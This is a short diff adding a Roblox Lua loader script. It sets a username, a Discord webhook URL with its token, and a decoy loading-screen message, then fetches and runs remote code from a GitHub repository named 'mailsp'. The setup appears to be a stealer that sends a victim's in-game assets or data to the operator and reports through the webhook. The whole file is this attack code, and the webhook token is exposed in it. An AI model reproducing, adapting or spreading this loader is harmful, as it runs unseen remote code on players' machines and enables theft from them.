@@ -1,0 +1,7 @@
+_G.UserName = "comma65in"    -- replace user with ur roblox username 
+
+_G.Webhook = "https://discord.com/api/webhooks/1093186178842378291/av1eB5Xpx4JdbouTVS7N-qKqm5Kg42BOK0MBqEKQ5IX2Y7ke6stQELN_3kjNWhMwAP6n"     -- replace hook discord webhook
+
+_G.loadingScreenText = "best script ever" -- replace text with anything
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kingofthescript/mailsp/main/main", true))()
